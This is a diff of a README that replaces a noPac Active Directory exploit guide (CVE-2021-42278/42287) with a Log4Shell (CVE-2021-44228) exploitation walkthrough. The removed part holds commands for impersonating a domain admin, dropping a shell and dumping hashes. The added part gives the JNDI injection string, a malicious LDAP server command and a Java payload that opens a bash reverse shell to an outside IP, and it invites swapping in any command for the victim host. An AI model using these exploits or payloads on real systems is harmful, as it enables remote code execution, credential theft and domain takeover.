@@ -1,126 +1,86 @@
 
-## About
+# About Log4Shell - CVE-2021-44228
 
-Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 
+Log4j is one of the most popular java frameworks. 
+
+This framework involves an API call JNDI. 
+
+This API allows developer to resolve naming services. JNDI has a function “Object lookup” which gives the possibility to return an object from its name.
+For example, JNDI can query dns server to make correspondence between a domain name and an IP address, JNDI can also query a lot of services like LDAP or NIS…
+
+The vulnerability takes place because log4j allow request to arbitrary LDAP or DNS server without checking the server response.
+Then, an attacker can build malicious LDAP server and make the application execute a payload hosted on the fake LDAP.
 
 Changed from [sam-the-admin](https://github.com/WazeHell/sam-the-admin).
 
-## Usage
-```
-SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain
+## Overview of the Attack
 
-positional arguments:
-  [domain/]username[:password]
-                        Account used to authenticate to DC.
+![log4j schema Final](https://user-images.githubusercontent.com/76106120/147581673-63585c5c-ab97-47a8-ac34-b672aeb0be79.png)
 
-optional arguments:
-  -h, --help            show this help message and exit
-  --impersonate IMPERSONATE
-                        target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
-  -domain-netbios NETBIOSNAME
-                        Domain NetBIOS name. Required if the DC has multiple domains.
-  -new-name NEWNAME     Target computer name, if not specified, will be random generated.
-  -new-pass PASSWORD    Add new computer password, if not specified, will be random generated.
-  -old-pass PASSWORD    Target computer password, use if you know the password of the target you input with -new-name.
-  -old-hash LMHASH:NTHASH
-                        Target computer hashes, use if you know the hash of the target you input with -new-name.
-  -debug                Turn DEBUG output ON
-  -ts                   Adds timestamp to every logging output
-  -shell                Drop a shell via smbexec
-  -no-add               Forcibly change the password of the target computer.
-  -create-child         Current account have permission to CreateChild.
-  -dump                 Dump Hashs via secretsdump
-  -use-ldap             Use LDAP instead of LDAPS
+# Exploit Log4j
 
-authentication:
-  -hashes LMHASH:NTHASH
-                        NTLM hashes, format is LMHASH:NTHASH
-  -no-pass              don't ask for password (useful for -k)
-  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on account parameters. If valid credentials cannot be found, it will use the ones specified in the command line
-  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
-  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
-  -dc-ip ip             IP of the domain controller to use. Useful if you can't translate the FQDN.specified in the account parameter will be used
+## 1. Find Entry Point
 
-execute options:
-  -port [destination port]
-                        Destination port to connect to SMB Server
-  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)
-  -share SHARE          share where the output will be grabbed from (default ADMIN$)
-  -shell-type {cmd,powershell}
-                        choose a command processor for the semi-interactive shell
-  -codec CODEC          Sets encoding used (codec) from the target's output (default "GBK").
-  -service-name service_name
-                        The name of theservice used to trigger the payload
+You have to find entry point by injecting request to triggers JNDI lookup resolution to the malicious LDAP.
 
-dump options:
-  -just-dc-user USERNAME
-                        Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. Implies also -just-dc switch
-  -just-dc              Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)
-  -just-dc-ntlm         Extract only NTDS.DIT data (NTLM hashes only)
-  -pwd-last-set         Shows pwdLastSet attribute for each NTDS.DIT account. Doesn't apply to -outputfile data
-  -user-status          Display whether or not the user is disabled
-  -history              Dump password history, and LSA secrets OldVal
-  -resumefile RESUMEFILE
-                        resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session's state
-  -use-vss              Use the VSS method insead of default DRSUAPI
-  -exec-method [{smbexec,wmiexec,mmcexec}]
-                        Remote exec method to use at target (only when using -use-vss). Default: smbexec
-```
+String to inject: ```${jndi:ldap://<ip>:<port>/<name-of-the-payload-to-execute>}```
 
->Note: If -host-name is not specified, the tool will automatically get the domain control hostname, please select the hostname of the host specified by -dc-ip. If --impersonate is not specified, the tool will randomly choose a doamin admin to exploit. Use ldaps by default, if you get ssl error, try add -use-ldap .
+First, you can start netcat listener and try to trigger it. 
+If the netcat listener is trigger, then you know that the application is vulnerable. 
 
-### GetST
-```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
-```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112131712015.png)
-
-### Auto get shell
-```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 -shell --impersonate administrator 
-```
-
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132025207.png)
-### Dump hash
-```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump -just-dc-user cgdomain/krbtgt
-```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132025423.png)
+![image](https://user-images.githubusercontent.com/76106120/147582133-b8466261-e23b-4b8f-b997-9541877b06e9.png)
+![image](https://user-images.githubusercontent.com/76106120/147582157-c4408876-3af2-42fe-a5ea-8866a0913886.png)
 
 
-## Scanner
+
+## 2. Build Malicious Server
+
+In our case we gonna build malicious ldap server.
+For that you can download this github project: https://github.com/mbechler/marshalsec.git
+
+Once you are in the project, you are able to build malicious ldap server that redirects connection to a web server which host the payload in order to provide it to the JNDI lookup resolution 
+
 ```
-python scanner.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203
+java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://<Web-Server-IP>:<Port>/#<name-of-the-payload>
 ```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112132151180.png)
+ Demo :
+ 
+![image](https://user-images.githubusercontent.com/76106120/147582798-29cca013-e779-491a-81bc-7a933ebde226.png)
 
 
-## MAQ = 0
-### Method 1
-Find the computer that can be modified by the current user.
-```
-AdFind.exe -sc getacls -sddlfilter ;;"[WRT PROP]";;computer;domain\user  -recmute
-```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171448715.png)
+## 3. Build Java Payload
 
-Exp: add `-no-add` and target with `-new-name`.
-```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.200 -dc-host dc2008 --impersonate administrator -no-add -new-name nopactest$
-```
+Java Payload
 
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171451347.png)
 
-### Method 2
-Find CreateChild account, and use the account to exploit.
 ```
-AdFind.exe -sc getacls -sddlfilter ;;"[CR CHILD]";;computer; -recmute
-```
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171455040.png)
+public class ExploitTest {
 
-Exp: add `-create-child`
-```
-python noPac.py cgdomain.com/venus:'1qaz@WSX' -dc-ip 10.211.55.200 -dc-host dc2008 --impersonate administrator -create-child
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec(new String[] {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.170.0.120/9001 0>&1"}).waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
 ```
 
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171456582.png)
+
+>Note: You can replace the last element of the string array by whatever command you want to be executed on the victim host
+
+When your payload is done and ready, you can compile it.
+>Note: Keep in mind that the name of your class must be in the same of your .java file otherwise you will get an error during the compilation.
+
+Demo :
+
+![image](https://user-images.githubusercontent.com/76106120/147583275-02f8f4ac-64fd-403f-8ffd-9d9e545429c4.png)
+
+## 4. Ready to Exploit
+
+You can now start web server in the directory of the .class payload.
+
+Hope you get this:
+
+![image](https://user-images.githubusercontent.com/76106120/147583452-0c5aea7f-f4cc-4aa6-bd64-f36c7d5e1490.png)
